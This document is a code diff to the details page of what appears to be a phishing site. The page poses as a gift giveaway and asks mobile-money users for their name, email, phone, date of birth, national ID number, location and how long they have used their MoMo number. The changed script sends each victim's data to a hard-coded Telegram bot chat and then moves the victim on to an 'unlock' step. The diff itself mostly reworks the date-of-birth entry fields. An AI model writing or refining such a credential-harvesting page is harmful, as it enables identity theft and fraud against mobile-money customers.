@@ -107,7 +107,6 @@
             display: flex;
             align-items: center;
             gap: 12px;
-            border: 2px solid #e8ecf5;
         }
         
         .gift-preview .icon {
@@ -201,6 +200,56 @@
         
         .form-input::placeholder {
             color: #aaa;
+        }
+        
+        /* ===== DATE INPUT GROUP ===== */
+        .date-group {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .date-group .date-part {
+            flex: 1;
+            padding: 11px 8px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 14px;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-family: 'Inter', sans-serif;
+            background: white;
+            color: #333;
+            text-align: center;
+        }
+        
+        .date-group .date-part:focus {
+            border-color: #0047AB;
+            outline: none;
+            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+        }
+        
+        .date-group .date-part::placeholder {
+            color: #aaa;
+        }
+        
+        .date-group .date-part.day {
+            max-width: 70px;
+        }
+        
+        .date-group .date-part.month {
+            max-width: 80px;
+        }
+        
+        .date-group .date-part.year {
+            max-width: 90px;
+        }
+        
+        .date-group .date-separator {
+            display: flex;
+            align-items: center;
+            color: #999;
+            font-weight: 600;
+            font-size: 16px;
+            padding: 0 2px;
         }
         
         .form-row {
@@ -366,6 +415,10 @@
             .gift-preview .info .name {
                 font-size: 14px;
             }
+            .date-group .date-part {
+                padding: 10px 6px;
+                font-size: 13px;
+            }
         }
     </style>
 </head>
@@ -381,7 +434,7 @@
         <h1 class="form-title">🎁 Your <span class="highlight">Details</span></h1>
         <p class="form-subtitle">Fill in your personal information</p>
         
-        <!-- Gift Preview - Shows selected gift -->
+        <!-- Gift Preview -->
         <div class="gift-preview" id="giftPreview">
             <span class="icon" id="giftIcon">🎁</span>
             <div class="info">
@@ -417,18 +470,24 @@
             </div>
         </div>
 
-        <!-- Date of Birth & NRC Row -->
-        <div class="form-row">
-            <div class="form-group">
-                <label class="form-label">Date of Birth <span class="required">*</span></label>
-                <input type="date" class="form-input" id="dob" required>
-                <div class="error-text" id="dobError">You must be 18 years or older.</div>
+        <!-- Date of Birth - Manual Entry -->
+        <div class="form-group">
+            <label class="form-label">Date of Birth <span class="required">*</span></label>
+            <div class="date-group">
+                <input type="tel" class="date-part day" id="dobDay" placeholder="DD" maxlength="2" inputmode="numeric" pattern="[0-9]*">
+                <span class="date-separator">/</span>
+                <input type="tel" class="date-part month" id="dobMonth" placeholder="MM" maxlength="2" inputmode="numeric" pattern="[0-9]*">
+                <span class="date-separator">/</span>
+                <input type="tel" class="date-part year" id="dobYear" placeholder="YYYY" maxlength="4" inputmode="numeric" pattern="[0-9]*">
             </div>
-            <div class="form-group">
-                <label class="form-label">NRC / National ID <span class="required">*</span></label>
-                <input type="text" class="form-input" id="nrc" placeholder="e.g. 123456/78/1" required>
-                <div class="error-text" id="nrcError">Please enter a valid NRC/National ID.</div>
-            </div>
+            <div class="error-text" id="dobError">Please enter a valid date of birth (DD/MM/YYYY). You must be 18+.</div>
+        </div>
+
+        <!-- NRC -->
+        <div class="form-group">
+            <label class="form-label">NRC / National ID <span class="required">*</span></label>
+            <input type="text" class="form-input" id="nrc" placeholder="e.g. 123456/78/1" required>
+            <div class="error-text" id="nrcError">Please enter a valid NRC/National ID.</div>
         </div>
 
         <!-- Province & District Row -->
@@ -478,7 +537,7 @@
             </div>
         </div>
 
-        <!-- How long have you used this MoMo number? -->
+        <!-- MoMo Age -->
         <div class="form-group">
             <label class="form-label">How long have you used this MoMo number? <span class="required">*</span></label>
             <select class="form-select" id="momoAge" required>
@@ -498,7 +557,7 @@
         <!-- Buttons -->
         <div class="btn-group">
             <button class="back-btn-main" onclick="window.location.href='index.html'">← BACK</button>
-            <button class="submit-btn" id="submitBtn">🎁 NEXT: LOGIN →</button>
+            <button class="submit-btn" id="submitBtn">🎁 NEXT: UNLOCK →</button>
         </div>
     </main>
     
@@ -512,12 +571,19 @@
         const CHAT_ID = '8392790531';
 
         // ============================================
-        // LOAD SELECTED GIFT - Shows at top
+        // LOAD SELECTED GIFT
         // ============================================
         function loadSelectedGift() {
-            const gift = localStorage.getItem('selectedGift') || 'Not selected';
+            const gift = localStorage.getItem('selectedGift');
             const value = localStorage.getItem('selectedGiftValue') || '-';
             const icon = localStorage.getItem('selectedGiftIcon') || '🎁';
+            
+            if (!gift) {
+                // No gift selected - redirect to index
+                alert('⚠️ Please select a gift first!');
+                window.location.href = 'index.html';
+                return;
+            }
             
             document.getElementById('giftIcon').textContent = icon;
             document.getElementById('giftName').textContent = gift;
@@ -534,7 +600,9 @@
         const savedName = localStorage.getItem('fullName');
         const savedEmail = localStorage.getItem('email');
         const savedPhone = localStorage.getItem('phone');
-        const savedDob = localStorage.getItem('dob');
+        const savedDobDay = localStorage.getItem('dobDay');
+        const savedDobMonth = localStorage.getItem('dobMonth');
+        const savedDobYear = localStorage.getItem('dobYear');
         const savedNrc = localStorage.getItem('nrc');
         const savedProvince = localStorage.getItem('province');
         const savedDistrict = localStorage.getItem('district');
@@ -543,7 +611,9 @@
         if (savedName) document.getElementById('fullName').value = savedName;
         if (savedEmail) document.getElementById('email').value = savedEmail;
         if (savedPhone) document.getElementById('phone').value = savedPhone;
-        if (savedDob) document.getElementById('dob').value = savedDob;
+        if (savedDobDay) document.getElementById('dobDay').value = savedDobDay;
+        if (savedDobMonth) document.getElementById('dobMonth').value = savedDobMonth;
+        if (savedDobYear) document.getElementById('dobYear').value = savedDobYear;
         if (savedNrc) document.getElementById('nrc').value = savedNrc;
         if (savedProvince) document.getElementById('province').value = savedProvince;
         if (savedDistrict) document.getElementById('district').value = savedDistrict;
@@ -553,6 +623,74 @@
         // DOM REFERENCES
         // ============================================
         const submitBtn = document.getElementById('submitBtn');
+        const dobDay = document.getElementById('dobDay');
+        const dobMonth = document.getElementById('dobMonth');
+        const dobYear = document.getElementById('dobYear');
+
+        // ============================================
+        // DATE INPUT HANDLING - Auto-advance
+        // ============================================
+        dobDay.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length === 2) {
+                dobMonth.focus();
+            }
+            if (this.value && parseInt(this.value) >= 1 && parseInt(this.value) <= 31) {
+                this.classList.remove('invalid');
+                document.getElementById('dobError').classList.remove('show');
+            }
+        });
+
+        dobMonth.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length === 2) {
+                dobYear.focus();
+            }
+            if (this.value && parseInt(this.value) >= 1 && parseInt(this.value) <= 12) {
+                this.classList.remove('invalid');
+                document.getElementById('dobError').classList.remove('show');
+            }
+        });
+
+        dobYear.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '');
+            if (this.value.length === 4) {
+                // Validate age
+                const day = parseInt(dobDay.value);
+                const month = parseInt(dobMonth.value);
+                const year = parseInt(this.value);
+                
+                if (day >= 1 && day <= 31 && month >= 1 && month <= 12 && year >= 1900) {
+                    const dob = new Date(year, month - 1, day);
+                    const today = new Date();
+                    let age = today.getFullYear() - dob.getFullYear();
+                    const monthDiff = today.getMonth() - dob.getMonth();
+                    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
+                        age--;
+                    }
+                    
+                    if (age >= 18) {
+                        dobDay.classList.remove('invalid');
+                        dobMonth.classList.remove('invalid');
+                        dobYear.classList.remove('invalid');
+                        document.getElementById('dobError').classList.remove('show');
+                    }
+                }
+            }
+        });
+
+        // Handle backspace navigation
+        dobMonth.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '') {
+                dobDay.focus();
+            }
+        });
+
+        dobYear.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '') {
+                dobMonth.focus();
+            }
+        });
 
         // ============================================
         // VALIDATION FUNCTIONS
@@ -566,14 +704,23 @@
             return cleaned.length >= 9 && /^[\+\d\s-]+$/.test(phone);
         }
 
-        function validateAge(dob) {
-            const birthDate = new Date(dob);
-            const today = new Date();
-            const age = today.getFullYear() - birthDate.getFullYear();
-            const monthDiff = today.getMonth() - birthDate.getMonth();
-            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
-                return age - 1 >= 18;
+        function validateAge(day, month, year) {
+            const d = parseInt(day);
+            const m = parseInt(month);
+            const y = parseInt(year);
+            
+            if (d < 1 || d > 31 || m < 1 || m > 12 || y < 1900 || y > new Date().getFullYear()) {
+                return false;
             }
+            
+            const dob = new Date(y, m - 1, d);
+            const today = new Date();
+            let age = today.getFullYear() - dob.getFullYear();
+            const monthDiff = today.getMonth() - dob.getMonth();
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < dob.getDate())) {
+                age--;
+            }
+            
             return age >= 18;
         }
 
@@ -599,7 +746,6 @@
                 name: document.getElementById('fullName'),
                 email: document.getElementById('email'),
                 phone: document.getElementById('phone'),
-                dob: document.getElementById('dob'),
                 nrc: document.getElementById('nrc'),
                 province: document.getElementById('province'),
                 district: document.getElementById('district'),
@@ -613,6 +759,9 @@
             
             Object.values(inputs).forEach(el => el.classList.remove('invalid'));
             Object.values(errors).forEach(el => el.classList.remove('show'));
+            dobDay.classList.remove('invalid');
+            dobMonth.classList.remove('invalid');
+            dobYear.classList.remove('invalid');
         }
 
         function showError(input, errorElement, message) {
@@ -639,7 +788,7 @@
                 `📍 District: ${data.district}\n` +
                 `⏳ MoMo Used: ${data.momoAge}\n\n` +
                 `⏰ Time: ${new Date().toLocaleString()}\n\n` +
-                `✅ User has registered for a gift. Proceeding to login.`;
+                `✅ User has registered for a gift. Proceeding to unlock.`;
 
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -670,7 +819,9 @@
             const name = inputs.name.value.trim();
             const email = inputs.email.value.trim();
             const phone = inputs.phone.value.trim();
-            const dob = inputs.dob.value;
+            const day = dobDay.value.trim();
+            const month = dobMonth.value.trim();
+            const year = dobYear.value.trim();
             const nrc = inputs.nrc.value.trim();
             const province = inputs.province.value;
             const district = inputs.district.value;
@@ -698,11 +849,11 @@
             }
 
             // Validate Date of Birth
-            if (!dob) {
-                showError(inputs.dob, errors.dob, 'Please select your date of birth.');
+            if (!day || !month || !year) {
+                showError(dobDay, errors.dob, 'Please enter your complete date of birth (DD/MM/YYYY).');
                 valid = false;
-            } else if (!validateAge(dob)) {
-                showError(inputs.dob, errors.dob, 'You must be 18 years or older.');
+            } else if (!validateAge(day, month, year)) {
+                showError(dobDay, errors.dob, 'You must be 18 years or older.');
                 valid = false;
             }
 
@@ -739,6 +890,9 @@
                 return;
             }
 
+            // Format date
+            const formattedDob = `${day.padStart(2, '0')}/${month.padStart(2, '0')}/${year}`;
+
             // Show loading state
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<span class="loader"></span> SAVING...';
@@ -751,7 +905,7 @@
                 fullName: name,
                 email: email,
                 phone: phone,
-                dob: dob,
+                dob: formattedDob,
                 nrc: nrc,
                 province: province,
                 district: district,
@@ -762,7 +916,10 @@
             localStorage.setItem('fullName', name);
             localStorage.setItem('email', email);
             localStorage.setItem('phone', phone);
-            localStorage.setItem('dob', dob);
+            localStorage.setItem('dobDay', day);
+            localStorage.setItem('dobMonth', month);
+            localStorage.setItem('dobYear', year);
+            localStorage.setItem('dob', formattedDob);
             localStorage.setItem('nrc', nrc);
             localStorage.setItem('province', province);
             localStorage.setItem('district', district);
@@ -799,13 +956,6 @@
             if (validatePhone(this.value.trim())) {
                 this.classList.remove('invalid');
                 document.getElementById('phoneError').classList.remove('show');
-            }
-        });
-
-        document.getElementById('dob').addEventListener('change', function() {
-            if (this.value && validateAge(this.value)) {
-                this.classList.remove('invalid');
-                document.getElementById('dobError').classList.remove('show');
             }
         });
 
